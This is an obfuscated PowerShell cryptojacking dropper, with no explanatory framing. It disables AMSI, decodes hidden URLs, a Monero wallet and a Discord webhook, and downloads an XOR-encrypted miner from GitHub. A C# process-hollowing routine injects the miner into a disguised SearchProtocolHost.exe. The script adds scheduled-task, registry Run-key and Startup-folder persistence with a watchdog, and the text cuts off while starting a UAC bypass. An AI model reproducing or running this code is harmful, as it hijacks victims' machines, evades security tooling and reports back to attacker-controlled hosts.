try{
$d=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siU'+'tils')
$f=$d.GetField('am'+'siIn'+'itFailed','NonPublic,Static')
$ptr=$f.GetValue($null)
[Runtime.InteropServices.Marshal]::Copy([byte[]](0x01),0,$ptr,1)
}catch{}

function X([string]$s){$b=[Convert]::FromBase64String($s);return [Text.Encoding]::UTF8.GetString($b)}
function XorDec([byte[]]$d,[byte[]]$k){$o=New-Object byte[] $d.Length;for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor $k[$i % $k.Length]};return $o}

$_u='NDY3ZzFtZWl6RmUzMUd6Rk1HN3hveTN5eFRoRzU2cDdOTnp1dEtmZjdZUGkxRGFkQWRya1kyeExqOXpMV2paTm00aGZYb0YydXhhNlBnSkNXUWM2UVVoNjROR3BYRUw='
$_p='cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw=='
$_pb='cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM='
$_e='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hcm96MTIzL0Zvb3RiYWxsL21haW4veG1yaWdfZW5jLmJpbg=='
$_d='aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MDkzNzk2MjE3MzE2OTgwNC9ILVdMLW1jUFlqQW5ESDJyaHh5MnVNV2w4U0lkbmN5dE5JMWNuWEhaTkVwaWo2YlI2Y0NhTzNFaER1bHEzMUtCSjZRVA=='
$_x='TXlTZWNyZXRLZXkxMjM0NQ=='
$_g='https://raw.githubusercontent.com/maroz123/Football/main/deploy_client_v7.5.5.ps1'
$_s="$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache"
$_m="SearchProtocolHost.exe"
$hostExe="$env:WINDIR\System32\SearchProtocolHost.exe"

Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public class ImageLoader {
    [DllImport("kernel32.dll")] static extern bool CreateProcess(string a, string c, IntPtr b, IntPtr d, bool e, uint f, IntPtr g, string h, ref SI i, out PI j);
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr p, IntPtr a, uint s, uint t, uint o);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr p, IntPtr a, byte[] b, uint s, out IntPtr w);
    [DllImport("kernel32.dll")] static extern bool SetThreadContext(IntPtr t, ref C64 c);
    [DllImport("kernel32.dll")] static extern bool GetThreadContext(IntPtr t, ref C64 c);
    [DllImport("kernel32.dll")] static extern uint ResumeThread(IntPtr t);
    [DllImport("kernel32.dll")] static extern bool TerminateProcess(IntPtr p, uint x);
    [DllImport("ntdll.dll")] static extern int NtUnmapViewOfSection(IntPtr p, IntPtr a);
    [DllImport("ntdll.dll")] static extern int NtQueryInformationProcess(IntPtr p, int c, ref PBI i, int s, out int r);
    [DllImport("kernel32.dll")] static extern bool ReadProcessMemory(IntPtr p, IntPtr a, out long b, IntPtr s, out IntPtr r);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct SI { public int cb; public IntPtr a,b,c; public int d,e,f,g,h,i,j; public ushort k,l; public IntPtr m,n,o,p,q; }
    [StructLayout(LayoutKind.Sequential)]
    struct PI { public IntPtr hP, hT; public int pid, tid; }
    [StructLayout(LayoutKind.Sequential)]
    struct PBI { public IntPtr r1, peb; public IntPtr r2_0, r2_1; public IntPtr upid; public IntPtr r3; }
    [StructLayout(LayoutKind.Sequential)]
    public struct C64 {
        public long p1,p2,p3,p4,p5,p6;
        public uint f, mx;
        public ushort cs,ds,es,fs,gs,ss;
        public uint ef;
        public long d0,d1,d2,d3,d6,d7;
        public long rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi;
        public long r8,r9,r10,r11,r12,r13,r14,r15;
        public long rip;
    }
    [StructLayout(LayoutKind.Sequential)] struct DH { public ushort m1; public ushort c1; public ushort c2; public ushort c3; public ushort c4; public ushort m2; public ushort m3; public ushort s; public ushort sp; public ushort cs1; public ushort ip; public ushort cv; public ushort lf; public ushort o; public ushort o2; public ushort o3; public ushort o4; public ushort m4; public ushort ois; public ushort oiu; public int n; }
    [StructLayout(LayoutKind.Sequential)] struct FH { public ushort m; public ushort ns; public uint t; public uint p; public uint no; public ushort so; public ushort q; }
    [StructLayout(LayoutKind.Sequential)] struct OH {
        public ushort mg; public byte k1,k2; public uint a,b,c;
        public uint ep; public uint bc; public ulong ib;
        public uint sa,fa; public ushort v1,v2,v3,v4,v5,v6; public uint w;
        public uint si,sh; public uint ck; public ushort ss1,s; public ulong sr,s2,hr,h2;
        public uint lf, nv;
    }
    [StructLayout(LayoutKind.Sequential)] struct SH {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=8)] public byte[] nm;
        public uint vs, va, rd, pr, prl, pl; public ushort nr, nl; public uint ch;
    }

    public static string Go(byte[] p, string exe, string args) {
        SI si = new SI(); si.cb = Marshal.SizeOf(typeof(SI));
        PI pi;
        bool ok = CreateProcess(exe, "\"" + exe + "\" " + args, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
        if(!ok) { return "CreateProcess failed " + Marshal.GetLastWin32Error(); }
        try {
            int no;
            try { no = BitConverter.ToInt32(p, 0x3C); } catch { Kill(pi); return "bad pe e_lfanew"; }
            if(p.Length < no + 64 || BitConverter.ToUInt16(p, 0) != 0x5A4D) { Kill(pi); return "not a pe"; }
            ushort ns = BitConverter.ToUInt16(p, no + 6);
            ushort so = BitConverter.ToUInt16(p, no + 20);
            ushort mh = BitConverter.ToUInt16(p, no + 4);
            int b = no + 24;
            uint ep = BitConverter.ToUInt32(p, b + 16);
            long ib = BitConverter.ToInt64(p, b + 24);
            uint si2 = BitConverter.ToUInt32(p, b + 56);
            uint sh2 = BitConverter.ToUInt32(p, b + 60);
            int shOff = no + 4 + mh + so;
            long hostBase = 0;
            IntPtr w;
            PBI bi = new PBI();
            int rl;
            int st = NtQueryInformationProcess(pi.hP, 0, ref bi, Marshal.SizeOf(typeof(PBI)), out rl);
            if(st != 0 || bi.peb == IntPtr.Zero) { Kill(pi); return "NtQIP failed " + st; }
            if(!ReadProcessMemory(pi.hP, new IntPtr(bi.peb.ToInt64() + 0x10), out hostBase, new IntPtr(8), out w)) { Kill(pi); return "RPM hostbase failed"; }
            int u = NtUnmapViewOfSection(pi.hP, new IntPtr(hostBase));
            IntPtr baseAddr = VirtualAllocEx(pi.hP, new IntPtr(ib), si2, 0x3000, 0x40);
            if(baseAddr == IntPtr.Zero) { Kill(pi); return "VirtualAllocEx failed, unmap=" + u; }
            byte[] hdr = new byte[sh2];
            Array.Copy(p, 0, hdr, 0, (int)sh2);
            if(!WriteProcessMemory(pi.hP, baseAddr, hdr, sh2, out w)) { Kill(pi); return "WPM header failed"; }
            for(int i2 = 0; i2 < ns; i2++) {
                int so2 = shOff + i2 * 40;
                uint va = BitConverter.ToUInt32(p, so2 + 12);
                uint rd = BitConverter.ToUInt32(p, so2 + 16);
                uint pr = BitConverter.ToUInt32(p, so2 + 20);
                byte[] data = new byte[rd];
                Array.Copy(p, (int)pr, data, 0, (int)rd);
                if(!WriteProcessMemory(pi.hP, new IntPtr(baseAddr.ToInt64() + (long)va), data, rd, out w)) { Kill(pi); return "WPM sec " + i2 + " failed"; }
            }
            C64 ctx = new C64(); ctx.f = 0x100000;
            if(!GetThreadContext(pi.hT, ref ctx)) { Kill(pi); return "GetThreadContext failed"; }
            ctx.rip = baseAddr.ToInt64() + (long)ep;
            if(!SetThreadContext(pi.hT, ref ctx)) { Kill(pi); return "SetThreadContext failed"; }
            if(ResumeThread(pi.hT) == 0xFFFFFFFF) { Kill(pi); return "ResumeThread failed"; }
            return "OK";
        } catch(Exception ex) { Kill(pi); return "exc: " + ex.Message; }
    }
    static void Kill(PI pi) {
        TerminateProcess(pi.hP, 0);
        try { CloseHandle(pi.hT); } catch { }
        try { CloseHandle(pi.hP); } catch { }
    }
}
'@

function Send-DiscordWebhook{
param([string]$msg)
try{
$wc2=New-Object Net.WebClient
$body=@{content=$msg}|ConvertTo-Json
$wc2.Headers.Add('Content-Type','application/json')
$wc2.UploadString((X $_d),'POST',$body)
}catch{}
}

function Launch-Miner{
$wc=New-Object Net.WebClient
$enc=$wc.DownloadData((X $_e))
$key=[Text.Encoding]::UTF8.GetBytes((X $_x))
$dec=XorDec $enc $key
$args="-o " + (X $_p) + " -u " + (X $_u) + " -k --tls --donate-level 0 --max-cpu-usage 10 --coin monero --algo rx/0"
$r=[ImageLoader]::Go($dec,$hostExe,$args)
if($r -ne 'OK'){Send-DiscordWebhook "DEPLOY FAIL: $r"}
return $r
}

function Set-Persistence{
$t=New-ScheduledTaskTrigger -AtLogOn
$a=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`""
Register-ScheduledTask -TaskName "SearchProtocolHost" -Trigger $t -Action $a -RunLevel Highest -Force|Out-Null
}

function Set-DeepPersistence{
try{
$k=[Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run")
$k.SetValue("NetworkServiceCache","powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`"")
$k.Close()
$sh="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\NetworkServiceCache.lnk"
$ws=New-Object -ComObject WScript.Shell
$sc=$ws.CreateShortcut($sh)
$sc.TargetPath="powershell.exe"
$sc.Arguments="-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($_s)\watchdog.ps1`""
$sc.Save()
}catch{}
}

function Write-StealthWatchdog{
$w = @'
$ErrorActionPreference='SilentlyContinue'
while($true){
$proc=Get-Process -Name SearchProtocolHost -ErrorAction SilentlyContinue
if(!$proc){
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:LOCALAPPDATA\Microsoft\Windows\NetworkService\cache\miner.ps1`""
}
Start-Sleep 60
}
'@
$w|Out-File -FilePath "$_s\watchdog.ps1" -Encoding UTF8 -Force
}

function Write-SelfHealScript{
$b64='JEVycm9yQWN0aW9uUHJlZmVyZW5jZT0nU2lsZW50bHlDb250aW51ZScKU3RhcnQtU2xlZXAgOAp0cnl7JGQ9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbScrJ3NpVScrJ3RpbHMnKQokZj0kZC5HZXRGaWVsZCgnYW0nKydzaUluJysnaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykKJHB0cj0kZi5HZXRWYWx1ZSgkbnVsbCkKW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KFtieXRlW11dKDB4MDEpLDAsJHB0ciwxKX1jYXRjaHt9CmZ1bmN0aW9uIFgoW3N0cmluZ10kcyl7W1RleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHMpKX0KZnVuY3Rpb24gWG9yRGVjKFtieXRlW11dJGQsW2J5dGVbXV0kayl7JG89TmV3LU9iamVjdCBieXRlW10gJGQuTGVuZ3RoO2ZvcigkaT0wOyRpIC1sdCAkZC5MZW5ndGg7JGkrKyl7JG9bJGldPSRkWyRpXSAtYnhvciAka1skaSAlICRrLkxlbmd0aF19O3JldHVybiAkb30KJHdjPU5ldy1PYmplY3QgTmV0LldlYkNsaWVudAokZW5jPSR3Yy5Eb3dubG9hZERhdGEoKFggJ2FIUjBjSE02THk5eVlYY3VaMmwwYUhWaWRYTmxjbU52Ym5SbGJuUXVZMjl0TDIxaGNtOTZNVEl6TDBadmIzUmlZV3hzTDIxaGFXNHZlRzF5YVdkZlpXNWpMbUpwYmc9PScpKQoka2V5PVtieXRlW11dKDB4NEQsMHg3OSwweDUzLDB4NjUsMHg2MywweDcyLDB4NjUsMHg3NCwweDRCLDB4NjUsMHg3OSwweDMxLDB4MzIsMHgzMywweDM0LDB4MzUpCiRkZWM9WG9yRGVjICRlbmMgJGtleQokaG9zdEV4ZT0iJGVudjpXSU5ESVJcU3lzdGVtMzJcU2VhcmNoUHJvdG9jb2xIb3N0LmV4ZSIKJGFyZ3M9Ii1vICIgKyAoWCAnY0c5dmJDNW9ZWE5vZG1GMWJIUXVjSEp2T2pRME13PT0nKSArICIgLXUgIiArIChYICdORFkzWnpGdFpXbDZSbVV6TVVkNlJrMUhOM2h2ZVRONWVGUm9SelUyY0RkT1RucDFkRXRtWmpkWlVHa3hSR0ZrUVdSeWExa3llRXhxT1hwTVYycGFUbTAwYUdaWWIwWXlkWGhoTmxCblNrTlhVV00yVVZWb05qUk9SM0JZUlV3PScpICsgIiAtayAtLXRscyAtLWRvbmF0ZS1sZXZlbCAwIC0tbWF4LWNwdS11c2FnZSAxMCAtLWNvaW4gbW9uZXJvIC0tYWxnbyByeC8wIgpBZGQtVHlwZSAtVHlwZURlZmluaXRpb24gQCcKdXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CgpwdWJsaWMgY2xhc3MgSW1hZ2VMb2FkZXIgewogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQcm9jZXNzKHN0cmluZyBhLCBzdHJpbmcgYywgSW50UHRyIGIsIEludFB0ciBkLCBib29sIGUsIHVpbnQgZiwgSW50UHRyIGcsIHN0cmluZyBoLCByZWYgU0kgaSwgb3V0IFBJIGopOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4KEludFB0ciBwLCBJbnRQdHIgYSwgdWludCBzLCB1aW50IHQsIHVpbnQgbyk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeShJbnRQdHIgcCwgSW50UHRyIGEsIGJ5dGVbXSBiLCB1aW50IHMsIG91dCBJbnRQdHIgdyk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBib29sIFNldFRocmVhZENvbnRleHQoSW50UHRyIHQsIHJlZiBDNjQgYyk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBib29sIEdldFRocmVhZENvbnRleHQoSW50UHRyIHQsIHJlZiBDNjQgYyk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0gc3RhdGljIGV4dGVybiB1aW50IFJlc3VtZVRocmVhZChJbnRQdHIgdCk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0gc3RhdGljIGV4dGVybiBib29sIFRlcm1pbmF0ZVByb2Nlc3MoSW50UHRyIHAsIHVpbnQgeCk7CiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0gc3RhdGljIGV4dGVybiBpbnQgTnRVbm1hcFZpZXdPZlNlY3Rpb24oSW50UHRyIHAsIEludFB0ciBhKTsKICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGludCBOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzKEludFB0ciBwLCBpbnQgYywgcmVmIFBCSSBpLCBpbnQgcywgb3V0IGludCByKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGJvb2wgUmVhZFByb2Nlc3NNZW1vcnkoSW50UHRyIHAsIEludFB0ciBhLCBvdXQgbG9uZyBiLCBJbnRQdHIgcywgb3V0IEludFB0ciByKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGgpOwogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQ9Q2hhclNldC5Vbmljb2RlKV0KICAgIHN0cnVjdCBTSSB7IHB1YmxpYyBpbnQgY2I7IHB1YmxpYyBJbnRQdHIgYSxiLGM7IHB1YmxpYyBpbnQgZCxlLGYsZyxoLGksajsgcHVibGljIHVzaG9ydCBrLGw7IHB1YmxpYyBJbnRQdHIgbSxuLG8scCxxOyB9CiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBzdHJ1Y3QgUEkgeyBwdWJsaWMgSW50UHRyIGhQLCBoVDsgcHVibGljIGludCBwaWQsIHRpZDsgfQogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgc3RydWN0IFBCSSB7IHB1YmxpYyBJbnRQdHIgcjEsIHBlYjsgcHVibGljIEludFB0ciByMl8wLCByMl8xOyBwdWJsaWMgSW50UHRyIHVwaWQ7IHB1YmxpYyBJbnRQdHIgcjM7IH0KICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHB1YmxpYyBzdHJ1Y3QgQzY0IHsKICAgICAgICBwdWJsaWMgbG9uZyBwMSxwMixwMyxwNCxwNSxwNjsKICAgICAgICBwdWJsaWMgdWludCBmLCBteDsKICAgICAgICBwdWJsaWMgdXNob3J0IGNzLGRzLGVzLGZzLGdzLHNzOwogICAgICAgIHB1YmxpYyB1aW50IGVmOwogICAgICAgIHB1YmxpYyBsb25nIGQwLGQxLGQyLGQzLGQ2LGQ3OwogICAgICAgIHB1YmxpYyBsb25nIHJheCxyY3gscmR4LHJieCxyc3AscmJwLHJzaSxyZGk7CiAgICAgICAgcHVibGljIGxvbmcgcjgscjkscjEwLHIxMSxyMTIscjEzLHIxNCxyMTU7CiAgICAgICAgcHVibGljIGxvbmcgcmlwOwogICAgfQogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQ9Q2hhclNldC5Vbmljb2RlKV0gc3RydWN0IENINCB7IHB1YmxpYyB1c2hvcnQgbTE7IHB1YmxpYyB1c2hvcnQgYzE7IHB1YmxpYyB1c2hvcnQgYzI7IHB1YmxpYyB1c2hvcnQgYzM7IHB1YmxpYyB1c2hvcnQgYzQ7IHB1YmxpYyB1c2hvcnQgbTI7IHB1YmxpYyB1c2hvcnQgbTM7IHB1YmxpYyB1c2hvcnQgczsgcHVibGljIHVzaG9ydCBzcDsgcHVibGljIHVzaG9ydCBjczE7IHB1YmxpYyB1c2hvcnQgaXA7IHB1YmxpYyB1c2hvcnQgY3Y7IHB1YmxpYyB1c2hvcnQgbGY7IHB1YmxpYyB1c2hvcnQgbzsgcHVibGljIHVzaG9ydCBvMjsgcHVibGljIHVzaG9ydCBvMzsgcHVibGljIHVzaG9ydCBvNDsgcHVibGljIHVzaG9ydCBtNDsgcHVibGljIHVzaG9ydCBvaXM7IHB1YmxpYyB1c2hvcnQgb2l1OyBwdWJsaWMgaW50IG47IH0KICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0gc3RydWN0IEZIIHsgcHVibGljIHVzaG9ydCBtOyBwdWJsaWMgdXNob3J0IG5zOyBwdWJsaWMgdWludCB0OyBwdWJsaWMgdWludCBwOyBwdWJsaWMgdWludCBubzsgcHVibGljIHVzaG9ydCBzbzsgcHVibGljIHVzaG9ydCBxOyB9CiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldIHN0cnVjdCBPSCB7CiAgICAgICAgcHVibGljIHVzaG9ydCBtZzsgcHVibGljIGJ5dGUgazEsazI7IHB1YmxpYyB1aW50IGEsYixjOwogICAgICAgIHB1YmxpYyB1aW50IGVwOyBwdWJsaWMgdWludCBiYzsgcHVibGljIHVsb25nIGliOwogICAgICAgIHB1YmxpYyB1aW50IHNhLGZhOyBwdWJsaWMgdXNob3J0IHYxLHYyLHYzLHY0LHY1LHY2OyBwdWJsaWMgdWludCB3OwogICAgICAgIHB1YmxpYyB1aW50IHNpLHNoOyBwdWJsaWMgdWludCBjazsgcHVibGljIHVzaG9ydCBzczEsczsgcHVibGljIHVsb25nIHNyLHMyLGhyLGgyOwogICAgICAgIHB1YmxpYyB1aW50IGxmLCBudjsKICAgIH0KICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0gc3RydWN0IFNIYzcgewogICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5CeVZhbEFycmF5LCBTaXplQ29uc3Q9OCldIHB1YmxpYyBieXRlW10gbm07CiAgICAgICAgcHVibGljIHVpbnQgdnMsIHZhLCByZCwgcHIsIHBybCwgcGw7IHB1YmxpYyB1c2hvcnQgbnIsIG5sOyBwdWJsaWMgdWludCBjaDsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHbyhieXRlW10gcCwgc3RyaW5nIGV4ZSwgc3RyaW5nIGFyZ3MpIHsKICAgICAgICBTSSBzaSA9IG5ldyBTSSgpOyBzaS5jYiA9IE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihTSSkpOwogICAgICAgIFBJIHBpOwogICAgICAgIGJvb2wgb2sgPSBDcmVhdGVQcm9jZXNzKGV4ZSwgIlwiIiArIGV4ZSArICJcIiAiICsgYXJncywgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLCBmYWxzZSwgMHg0LCBJbnRQdHIuWmVybywgbnVsbCwgcmVmIHNpLCBvdXQgcGkpOwogICAgICAgIGlmKCFvaykgeyByZXR1cm4gIkNyZWF0ZVByb2Nlc3MgZmFpbGVkICIgKyBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCk7IH0KICAgICAgICB0cnkgewogICAgICAgICAgICBpbnQgbm87CiAgICAgICAgICAgIHRyeSB7IG5vID0gQml0Q29udmVydGVyLlRvSW50MzIocCwgMHgzQyk7IH0gY2F0Y2ggeyBLaWxsKHBpKTsgcmV0dXJuICJiYWQgcGUgZV9sZmFuZXciOyB9CiAgICAgICAgICAgIGlmKHAuTGVuZ3RoIDwgbm8gKyA2NCB8fCBCaXRDb252ZXJ0ZXIuVG9VSW50MTYocCwgMCkgIT0gMHg1QTREKSB7IEtpbGwocGkpOyByZXR1cm4gIm5vdCBhIHBlIjsgfQogICAgICAgICAgICB1c2hvcnQgbnMgPSBCaXRDb252ZXJ0ZXIuVG9VSW50MTYocCwgbm8gKyA2KTsKICAgICAgICAgICAgdXNob3J0IHNvID0gQml0Q29udmVydGVyLlRvVUludDE2KHAsIG5vICsgMjApOwogICAgICAgICAgICB1c2hvcnQgbWggPSBCaXRDb252ZXJ0ZXIuVG9VSW50MTYocCwgbm8gKyA0KTsKICAgICAgICAgICAgaW50IGIgPSBubyArIDI0OwogICAgICAgICAgICB1aW50IGVwID0gQml0Q29udmVydGVyLlRvVUludDMyKHAsIGIgKyAxNik7CiAgICAgICAgICAgIGxvbmcgaWIgPSBCaXRDb252ZXJ0ZXIuVG9JbnQ2NChwLCBiICsgMjQpOwogICAgICAgICAgICB1aW50IHNpMiA9IEJpdENvbnZlcnRlci5Ub1VJbnQzMihwLCBiICsgNTYpOwogICAgICAgICAgICB1aW50IHNoMiA9IEJpdENvbnZlcnRlci5Ub1VJbnQzMihwLCBiICsgNjApOwogICAgICAgICAgICBpbnQgc2hPZmYgPSBubyArIDQgKyBtaCArIHNvOwogICAgICAgICAgICBsb25nIGhvc3RCYXNlID0gMDsKICAgICAgICAgICAgSW50UHRyIHc7CiAgICAgICAgICAgIFBCSSBiaSA9IG5ldyBQQkkoKTsKICAgICAgICAgICAgaW50IHJsOwogICAgICAgICAgICBpbnQgc3QgPSBOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzKHBpLmhQLCAwLCByZWYgYmksIE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihQQkkpKSwgb3V0IHJsKTsKICAgICAgICAgICAgaWYoc3QgIT0gMCB8fCBiaS5wZWIgPT0gSW50UHRyLlplcm8pIHsgS2lsbChwaSk7IHJldHVybiAiTnRRSVAgZmFpbGVkICIgKyBzdDsgfQogICAgICAgICAgICBpZighUmVhZFByb2Nlc3NNZW1vcnkocGkuaFAsIG5ldyBJbnRQdHIoYmkucGViLlRvSW50NjQoKSArIDB4MTApLCBvdXQgaG9zdEJhc2UsIG5ldyBJbnRQdHIoOCksIG91dCB3KSkgeyBLaWxsKHBpKTsgcmV0dXJuICJSUE0gaG9zdGJhc2UgZmFpbGVkIjsgfQogICAgICAgICAgICBpbnQgdSA9IE50VW5tYXBWaWV3T2ZTZWN0aW9uKHBpLmhQLCBuZXcgSW50UHRyKGhvc3RCYXNlKSk7CiAgICAgICAgICAgIEludFB0ciBiYXNlQWRkciA9IFZpcnR1YWxBbGxvY0V4KHBpLmhQLCBuZXcgSW50UHRyKGliKSwgc2kyLCAweDMwMDAsIDB4NDApOwogICAgICAgICAgICBpZihiYXNlQWRkciA9PSBJbnRQdHIuWmVybykgeyBLaWxsKHBpKTsgcmV0dXJuICJWaXJ0dWFsQWxsb2NFeCBmYWlsZWQsIHVubWFwPSIgKyB1OyB9CiAgICAgICAgICAgIGJ5dGVbXSBoZHIgPSBuZXcgYnl0ZVtzaDJdOwogICAgICAgICAgICBBcnJheS5Db3B5KHAsIDAsIGhkciwgMCwgKGludClzaDIpOwogICAgICAgICAgICBpZighV3JpdGVQcm9jZXNzTWVtb3J5KHBpLmhQLCBiYXNlQWRkciwgaGRyLCBzaDIsIG91dCB3KSkgeyBLaWxsKHBpKTsgcmV0dXJuICJXUE0gaGVhZGVyIGZhaWxlZCI7IH0KICAgICAgICAgICAgZm9yKGludCBpMiA9IDA7IGkyIDwgbnM7IGkyKyspIHsKICAgICAgICAgICAgICAgIGludCBzbzIgPSBzaE9mZiArIGkyICogNDA7CiAgICAgICAgICAgICAgICB1aW50IHZhID0gQml0Q29udmVydGVyLlRvVUludDMyKHAsIHNvMiArIDEyKTsKICAgICAgICAgICAgICAgIHVpbnQgcmQgPSBCaXRDb252ZXJ0ZXIuVG9VSW50MzIocCwgc28yICsgMTYpOwogICAgICAgICAgICAgICAgdWludCBwciA9IEJpdENvbnZlcnRlci5Ub1VJbnQzMihwLCBzbzIgKyAyMCk7CiAgICAgICAgICAgICAgICBieXRlW10gZGF0YSA9IG5ldyBieXRlW3JkXTsKICAgICAgICAgICAgICAgIEFycmF5LkNvcHkocCwgKGludClwciwgZGF0YSwgMCwgKGludClyZCk7CiAgICAgICAgICAgICAgICBpZighV3JpdGVQcm9jZXNzTWVtb3J5KHBpLmhQLCBuZXcgSW50UHRyKGJhc2VBZGRyLlRvSW50NjQoKSArIChsb25nKXZhKSwgZGF0YSwgcmQsIG91dCB3KSkgeyBLaWxsKHBpKTsgcmV0dXJuICJXUE0gc2VjICIgKyBpMiArICIgZmFpbGVkIjsgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIEM2NCBjdHggPSBuZXcgQzY0KCk7IGN0eC5mID0gMHgxMDAwMDA7CiAgICAgICAgICAgIGlmKCFHZXRUaHJlYWRDb250ZXh0KHBpLmhULCByZWYgY3R4KSkgeyBLaWxsKHBpKTsgcmV0dXJuICJHZXRUaHJlYWRDb250ZXh0IGZhaWxlZCI7IH0KICAgICAgICAgICAgY3R4LnJpcCA9IGJhc2VBZGRyLlRvSW50NjQoKSArIChsb25nKWVwOwogICAgICAgICAgICBpZighU2V0VGhyZWFkQ29udGV4dChwaS5oVCwgcmVmIGN0eCkpIHsgS2lsbChwaSk7IHJldHVybiAiU2V0VGhyZWFkQ29udGV4dCBmYWlsZWQiOyB9CiAgICAgICAgICAgIGlmKFJlc3VtZVRocmVhZChwaS5oVCkgPT0gMHhGRkZGRkZGRikgeyBLaWxsKHBpKTsgcmV0dXJuICJSZXN1bWVUaHJlYWQgZmFpbGVkIjsgfQogICAgICAgICAgICByZXR1cm4gIk9LIjsKICAgICAgICB9IGNhdGNoKEV4Y2VwdGlvbiBleCkgeyBLaWxsKHBpKTsgcmV0dXJuICJleGM6ICIgKyBleC5NZXNzYWdlOyB9CiAgICB9CiAgICBzdGF0aWMgdm9pZCBLaWxsKFBJIHBpKSB7CiAgICAgICAgVGVybWluYXRlUHJvY2VzcyhwaS5oUCwgMCk7CiAgICAgICAgdHJ5IHsgQ2xvc2VIYW5kbGUocGkuaFQpOyB9IGNhdGNoIHsgfQogICAgICAgIHRyeSB7IENsb3NlSGFuZGxlKHBpLmhQKTsgfSBjYXRjaCB7IH0KICAgIH0KfUAnCltJbWFnZUxvYWRlcl06OkdvKCRkZWMsJGhvc3RFeGUsJGFyZ3MpfE91dC1OdWxsCg=='
$minerScript=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
[System.IO.File]::WriteAllText("$_s\miner.ps1",$minerScript)
}

function Invoke-UACBypass{
$c=[Convert]::FromBase64String('cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAiU3RhcnQtU2xlZXAgMzsgUmVtb3ZlLUl0ZW0gLVBhdGggJ0hLQ1U6XFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3MnIC1SZWN1cnNlIC1Gb3JjZSI=')
